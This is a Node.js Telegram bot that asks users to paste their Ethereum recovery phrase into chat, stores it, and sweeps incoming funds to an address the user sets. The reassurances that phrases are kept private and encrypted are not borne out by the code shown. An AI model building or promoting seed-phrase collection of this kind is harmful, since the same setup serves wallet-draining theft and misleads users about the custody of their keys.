const TelegramBot = require("node-telegram-bot-api");
const { ethers } = require("ethers");
require("dotenv").config();

const { getUserManager } = require("./user-manager");
const { getMultiUserSweeper } = require("./multi-user-sweeper");

const {
  getWalletFromMnemonic,
  getTokenBalances,
  isTestnetMode,
  formatNativeBalance,
} = require("./wallet-utils");

const BOT_TOKEN = process.env.BOT_TOKEN;
const MAX_USERS = parseInt(process.env.MAX_USERS) || 3;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const userManager = getUserManager();
const multiUserSweeper = getMultiUserSweeper();

// Send startup message
console.log("🎉 Multi-user Ethereum auto-sweep bot is starting...");
console.log(`👥 Maximum users allowed: ${MAX_USERS}`);
console.log(
  `🌐 Running in: ${
    isTestnetMode
      ? "🧪 Safe Test Mode (practice with fake money)"
      : "📡 Live Mode (real cryptocurrency)"
  }`
);
console.log(`💎 Ready to help with: Ethereum`);

// --- Chain configs based on TEST_MODE ---
function getChainConfigs() {
  if (isTestnetMode) {
    return {
      ethereum: {
        name: "Ethereum Sepolia",
        chainId: 11155111,
        rpcUrl: process.env.ETH_RPC,
        usdThreshold: 1, // Lower threshold for testnet
        nativeUsdThreshold: 10, // Lower native token threshold for testnet
        pollInterval: 30000, // Longer interval for testnet
        testnet: true,
      },
    };
  }

  // Mainnet configuration
  return {
    ethereum: {
      name: "Ethereum",
      chainId: 1,
      rpcUrl: process.env.ETH_RPC,
      usdThreshold: 10,
      nativeUsdThreshold: 5,
      pollInterval: 20000,
      testnet: false,
    },
  };
}

const chains = getChainConfigs();

// --- Helper functions ---
async function ensureUserRegistered(userId) {
  let userData = userManager.getUserData(userId);
  if (!userData) {
    if (!userManager.canRegisterNewUser()) {
      throw new Error(
        `Sorry! The bot has reached its maximum capacity of ${MAX_USERS} users. Please try again later.`
      );
    }
    userData = await userManager.registerUser(userId);
  }
  userManager.updateUserActivity(userId);
  return userData;
}

// --- Commands ---

bot.onText(/^\/help$/, async (msg) => {
  const userId = msg.chat.id.toString();

  try {
    await ensureUserRegistered(userId);
  } catch (error) {
    return bot.sendMessage(msg.chat.id, `❌ ${error.message}`);
  }

  const modeInfo = isTestnetMode
    ? "🧪 Test Mode (Practice with fake money)"
    : "📡 Live Mode (Real cryptocurrency)";

  // HTML-escape helper (important!)
  const escapeHtml = (str) =>
    String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");

  const stats = multiUserSweeper.getGlobalStats();

  const helpText = [
    "🌟 <b>Welcome!</b>",
    "",
    "",
    `🌐 <b>Currently running in:</b> ${escapeHtml(modeInfo)}`,
    "",
    "<b>🚀 Getting Started:</b>",
    "<code>/setup</code> - Quick setup wizard (recommended for beginners)",
    "<code>/connect_wallet</code> - Connect your wallet securely",
    "<code>/set_destination</code> - Choose where to send collected funds",
    "",
    "<b>⚡ Quick Actions:</b>",
    "<code>/start_collecting</code> - Begin auto-collecting on Ethereum",
    "<code>/stop</code> - Stop all collection activities",
    "<code>/check_status</code> - See what's currently running",
    "",
    "🔍 <b>Explore Your Funds:</b>",
    "<code>/check_balance</code> - See your funds",
    "",
    "<b>💎 Blockchain:</b> Ethereum",
    "",
    isTestnetMode
      ? "🛡️ <b>Safe Mode</b>: You're in test mode - perfect for learning without risk!"
      : "⚠️ <b>Live Mode</b>: Real cryptocurrency - please double-check everything!",
    "",
    "Need help? Just ask me anything! 😊",
  ].join("\n");

  bot
    .sendMessage(msg.chat.id, helpText, { parse_mode: "HTML" })
    .catch((err) => {
      console.error(
        "Failed to send help (HTML). Falling back to plain text:",
        err
      );

      let plain = helpText.replace(/<\/?[^>]+(>|$)/g, "");
      plain = plain
        .replace(/&amp;/g, "&")
        .replace(/&lt;/g, "<")
        .replace(/&gt;/g, ">");

      bot.sendMessage(msg.chat.id, plain).catch((err2) => {
        console.error("Failed to send help fallback:", err2);
      });
    });
});

// Add setup wizard command
bot.onText(/^\/setup$/, async (msg) => {
  const userId = msg.chat.id.toString();

  try {
    await ensureUserRegistered(userId);
  } catch (error) {
    return bot.sendMessage(msg.chat.id, `❌ ${error.message}`);
  }

  const setupText = `
🌟 <b>Let's get you set up in 2 easy steps!</b>

<b>Step 1: Connect Your Wallet</b> 🔐
Use: <code>/connect_wallet</code> followed by your recovery phrase
Example: <code>/connect_wallet word1 word2 word3...</code>

💡 <i>Your recovery phrase is like your master key - it stays completely private and secure with me!</i>

<b>Step 2: Choose Your Safe</b> 🏦
Use: <code>/set_destination</code> followed by your main wallet address
Example: <code>/set_destination 0x1234...</code>

💡 <i>This is where I'll send all collected funds - like your main savings account!</i>

<b>That's it!</b> Once setup is complete, you can start collecting Ethereum funds with:
• <code>/start_collecting</code>

${
  isTestnetMode
    ? "🛡️ Don't worry - you're in safe test mode!"
    : "⚠️ Please double-check addresses in live mode!"
}

Ready to begin? 🚀
`.trim();

  bot.sendMessage(msg.chat.id, setupText, { parse_mode: "HTML" });
});

bot.onText(/^\/connect_wallet (.+)/, async (msg, match) => {
  const userId = msg.chat.id.toString();

  try {
    await ensureUserRegistered(userId);
  } catch (error) {
    return bot.sendMessage(msg.chat.id, `❌ ${error.message}`);
  }

  const phrase = match[1].trim();
  if (!ethers.Mnemonic.isValidMnemonic(phrase)) {
    return bot.sendMessage(
      msg.chat.id,
      "🤔 Hmm, that doesn't look like a valid recovery phrase. Please check and try again!\n\n💡 Tip: Recovery phrases are usually 12 or 24 words separated by spaces."
    );
  }

  try {
    await userManager.setUserMnemonic(userId, phrase);
    bot.sendMessage(
      msg.chat.id,
      "🎉 Great! Your wallet is now connected securely!\n\n👉 Next step: Use /set_destination to choose where funds should be sent.\n\n🔒 Your recovery phrase is safely stored and encrypted."
    );
  } catch (error) {
    bot.sendMessage(msg.chat.id, `❌ Error saving wallet: ${error.message}`);
  }
});

bot.onText(/^\/set_destination (.+)/, async (msg, match) => {
  const userId = msg.chat.id.toString();

  try {
    await ensureUserRegistered(userId);
  } catch (error) {
    return bot.sendMessage(msg.chat.id, `❌ ${error.message}`);
  }

  const address = match[1].trim();
  if (!ethers.isAddress(address)) {
    return bot.sendMessage(
      msg.chat.id,
      "🤔 That doesn't look like a valid wallet address. Please double-check and try again!\n\n💡 Tip: Wallet addresses start with '0x' and are 42 characters long."
    );
  }

  try {
    await userManager.setUserDestAddress(userId, address);
    const shortAddress = `${address.substring(0, 6)}...${address.substring(
      address.length - 4
    )}`;
    bot.sendMessage(
      msg.chat.id,
      `🎯 Perfect! Your destination wallet is set to: ${shortAddress}\n\n✅ Setup complete! You can now start collecting funds with /start_collecting or check your current balance with /check_balance`
    );
  } catch (error) {
    bot.sendMessage(
      msg.chat.id,
      `❌ Error saving destination: ${error.message}`
    );
  }
});

bot.onText(/^\/start_collecting$/, async (msg) => {
  const userId = msg.chat.id.toString();

  try {
    await ensureUserRegistered(userId);
  } catch (error) {
    return bot.sendMessage(msg.chat.id, `❌ ${error.message}`);
  }

  const userData = userManager.getUserData(userId);
  const mnemonic = userManager.getUserMnemonic(userId);

  if (!mnemonic) {
    return bot.sendMessage(
      msg.chat.id,
      "🔐 Please connect your wallet first using /connect_wallet or /setup"
    );
  }

  if (!userData.destAddress) {
    return bot.sendMessage(
      msg.chat.id,
      "💰 Please set your destination wallet first using /set_destination or /setup"
    );
  }

  const chainKey = "ethereum"; // Default to ethereum
  const config = chains[chainKey];

  if (multiUserSweeper.getUserSweeperStatus(userId, chainKey)) {
    return bot.sendMessage(
      msg.chat.id,
      `👍 Good news! I'm already collecting funds on ${config.name}.\n\nCheck /check_status to see current status.`
    );
  }

  const friendlyChainName = config.name
    .replace(" Testnet", "")
    .replace(" Sepolia", "")
    .replace(" Amoy", "");
  bot.sendMessage(
    msg.chat.id,
    `🚀 Starting automatic fund collection on ${friendlyChainName}!\n\n🔍 I'll monitor your wallet and automatically collect any funds that appear.\n💫 You'll get notified when funds are moved.`
  );

  multiUserSweeper.startSweeperForUser(
    userId,
    chainKey,
    config,
    mnemonic,
    userData.destAddress,
    (event) => bot.sendMessage(msg.chat.id, event)
  );
});

bot.onText(/^\/stop$/, async (msg) => {
  const userId = msg.chat.id.toString();

  try {
    await ensureUserRegistered(userId);
  } catch (error) {
    return bot.sendMessage(msg.chat.id, `❌ ${error.message}`);
  }

  const activeSweepers = multiUserSweeper.getUserActiveSweepers(userId);
  const activeCount = activeSweepers.length;

  multiUserSweeper.stopAllSweepersForUser(userId);

  if (activeCount > 0) {
    bot.sendMessage(
      msg.chat.id,
      `✋ All collection activities stopped!\n\n💤 Your funds are safe - I've just paused the automatic collecting.`
    );
  } else {
    bot.sendMessage(
      msg.chat.id,
      "😊 No collection activities were running. Everything is already stopped!"
    );
  }
});

bot.onText(/^\/check_status$/, async (msg) => {
  const userId = msg.chat.id.toString();

  try {
    await ensureUserRegistered(userId);
  } catch (error) {
    return bot.sendMessage(msg.chat.id, `❌ ${error.message}`);
  }

  const userData = userManager.getUserData(userId);
  const chainKey = "ethereum";
  const config = chains[chainKey];
  const friendlyName = config.name
    .replace(" Testnet", "")
    .replace(" Sepolia", "")
    .replace(" Amoy", "");

  const status = multiUserSweeper.getUserSweeperStatus(userId, chainKey)
    ? "🟢 Actively collecting"
    : "⏸️ Paused";

  const modeInfo = isTestnetMode
    ? "🧪 Test Mode (Practice)"
    : "📡 Live Mode (Real crypto)";
  const destInfo = userData.destAddress
    ? `${userData.destAddress.substring(
        0,
        6
      )}...${userData.destAddress.substring(userData.destAddress.length - 4)}`
    : "❌ Not set yet";

  bot.sendMessage(
    msg.chat.id,
    `📊 Your Collection Status:\n\n🌐 Mode: ${modeInfo}\n💰 Funds go to: ${destInfo}\n\n${friendlyName}: ${status}\n\n💡 Use /start_collecting to begin collecting!`
  );
});

bot.onText(/^\/check_balance$/, async (msg) => {
  const userId = msg.chat.id.toString();

  try {
    await ensureUserRegistered(userId);
  } catch (error) {
    return bot.sendMessage(msg.chat.id, `❌ ${error.message}`);
  }

  const mnemonic = userManager.getUserMnemonic(userId);
  if (!mnemonic) {
    return bot.sendMessage(
      msg.chat.id,
      "🔐 Please connect your wallet first using /connect_wallet or try /setup for a guided experience!"
    );
  }

  const chainKey = "ethereum"; // Default to ethereum
  const config = chains[chainKey];

  try {
    bot.sendMessage(
      msg.chat.id,
      `🔍 Checking your funds on ${config.name
        .replace(" Testnet", "")
        .replace(" Sepolia", "")
        .replace(" Amoy", "")}...`
    );

    const wallet = getWalletFromMnemonic(mnemonic, chainKey);

    // Native balance - use proper formatting for each chain
    const nativeBalance = await wallet.provider.getBalance(wallet.address);
    const nativeInfo = formatNativeBalance(chainKey, nativeBalance);

    // ERC20 balances
    const tokens = await getTokenBalances(chainKey, wallet.address);

    const modeIndicator = isTestnetMode ? "🧪" : "📡";
    const friendlyChainName = config.name
      .replace(" Testnet", "")
      .replace(" Sepolia", "")
      .replace(" Amoy", "");
    const shortAddress = `${wallet.address.substring(
      0,
      6
    )}...${wallet.address.substring(wallet.address.length - 4)}`;

    let reply = `${modeIndicator} Your ${friendlyChainName} Wallet\n\n📍 Address: ${shortAddress}\n\n💎 Your Funds:\n\n`;

    reply += `💠 ${nativeInfo.formatted} ${nativeInfo.symbol}\n`;

    if (tokens.length) {
      tokens.forEach((t) => {
        const formatted = ethers.formatUnits(t.balance, t.decimals);
        const shortContract = `${t.contract.substring(
          0,
          6
        )}...${t.contract.substring(t.contract.length - 4)}`;
        reply += `🪙 ${formatted} ${t.symbol}\n`;
      });
    } else {
      reply += `\n😊 No other tokens found (which is perfectly normal!)`;
    }

    if (isTestnetMode) {
      reply += `\n\n🛡️ This is test mode - these aren't real funds`;
    }

    reply += `\n\n💡 Want to collect these funds automatically? \n Use <code>/start_collecting</code>`;

    bot.sendMessage(msg.chat.id, reply, { parse_mode: "HTML" });
  } catch (err) {
    bot.sendMessage(
      msg.chat.id,
      `😔 Oops! I had trouble checking your ${config.name} wallet.\n\n🔧 Technical details: ${err.message}\n\n💡 This sometimes happens with network connectivity. Try again in a moment!`
    );
  }
});

// Admin commands
bot.onText(/^\/admin_stats$/, async (msg) => {
  const userId = msg.chat.id.toString();
  const adminId = process.env.ADMIN_CHAT_ID;

  if (adminId && userId !== adminId) {
    return bot.sendMessage(msg.chat.id, "❌ Admin access required");
  }

  const stats = multiUserSweeper.getGlobalStats();
  const allUsers = userManager.getAllUsers();

  const statsText = [
    "🔧 <b>Bot Statistics</b>",
    "",
    `👥 Users: ${stats.totalUsers}/${stats.maxUsers}`,
    `🚀 Active Sweepers: ${stats.totalActiveSweepers}`,
    `⚡ Active Users: ${stats.activeUsers}`,
    "",
    "<b>Recent Users:</b>",
    ...allUsers
      .slice(-5)
      .map(
        (user) =>
          `• ${user.id.substring(0, 8)}... (${
            user.isSetupComplete ? "✅" : "⏳"
          })`
      ),
  ].join("\n");

  bot.sendMessage(msg.chat.id, statsText, { parse_mode: "HTML" });
});

// Legacy command support with helpful redirects
bot.onText(/^\/setwallet/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    "🔄 Command updated! Please use /connect_wallet instead.\n\n💡 Or try /setup for a guided experience!"
  );
});

bot.onText(/^\/settarget/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    "🔄 Command updated! Please use /set_destination instead.\n\n💡 Or try /setup for a guided experience!"
  );
});

bot.onText(/^\/enable/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    "🔄 Command updated! Please use /start_collecting instead."
  );
});

bot.onText(/^\/disable/, (msg) => {
  bot.sendMessage(msg.chat.id, "🔄 Command updated! Please use /stop instead.");
});

bot.onText(/^\/status/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    "🔄 Command updated! Please use /check_status instead."
  );
});

bot.onText(/^\/discover/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    "🔄 Command updated! Please use /check_balance instead."
  );
});

// Friendly conversation handlers
bot.on("message", (msg) => {
  const text = msg.text?.toLowerCase();
  if (!text || text.startsWith("/")) return;

  // Handle common questions and phrases
  if (text.includes("help") || text.includes("what") || text.includes("how")) {
    bot.sendMessage(
      msg.chat.id,
      "👋 Hi there! I'm here to help you automatically collect and organize your crypto!\n\n🌟 Try /help to see all my capabilities, or /setup to get started quickly!"
    );
  } else if (
    text.includes("balance") ||
    text.includes("funds") ||
    text.includes("money")
  ) {
    bot.sendMessage(
      msg.chat.id,
      "💰 Want to check your balance? Use /check_balance to see your Ethereum funds!"
    );
  } else if (
    text.includes("start") ||
    text.includes("begin") ||
    text.includes("collect")
  ) {
    bot.sendMessage(
      msg.chat.id,
      "🚀 Ready to start collecting? Use /start_collecting to begin collecting Ethereum funds!\n\n💡 Need to set up first? Try /setup!"
    );
  } else if (text.includes("stop") || text.includes("pause")) {
    bot.sendMessage(
      msg.chat.id,
      "✋ To stop all collection activities, use /stop\n\nTo check what's currently running, use /check_status"
    );
  }
});

console.log("✅ Multi-user bot is ready and listening for commands!");
